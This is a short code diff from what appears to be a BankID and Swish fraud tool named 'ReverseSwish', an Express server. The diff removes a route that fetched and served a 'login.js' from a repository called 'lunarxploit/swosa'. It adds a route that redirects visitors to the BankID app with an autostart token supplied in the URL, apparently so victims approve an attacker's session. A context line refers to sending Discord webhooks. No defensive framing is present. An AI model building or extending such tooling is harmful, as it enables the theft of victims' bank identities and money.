@@ -14,17 +14,15 @@ app.get("/", (req, res) => {
   res.send("ReverseSwish is running! 🚀");
 });
 
-app.get("/bankid", async (req, res) => {
-  try {
-    // Fetch the content of bankid.js from GitHub
-    const response = await axios.get('https://raw.githubusercontent.com/lunarxploit/swosa/master/login.js');
-    
-    // Send the fetched JavaScript content as the response
-    res.send(response.data);
-  } catch (error) {
-    console.error("Error fetching bankid.js:", error);
-    res.status(500).send("Error fetching bankid.js");
-  }
+app.get("/autostarttoken=:token", async (req, res) => {
+  // Extract the token from the request parameters
+  const token = req.params.token;
+  
+  // Construct the redirect URL
+  const redirectUrl = `bankid:///?autostarttoken=${token}`;
+  
+  // Send the redirect response
+  res.redirect(redirectUrl);
 });
 
   // Function to send Discord webhook
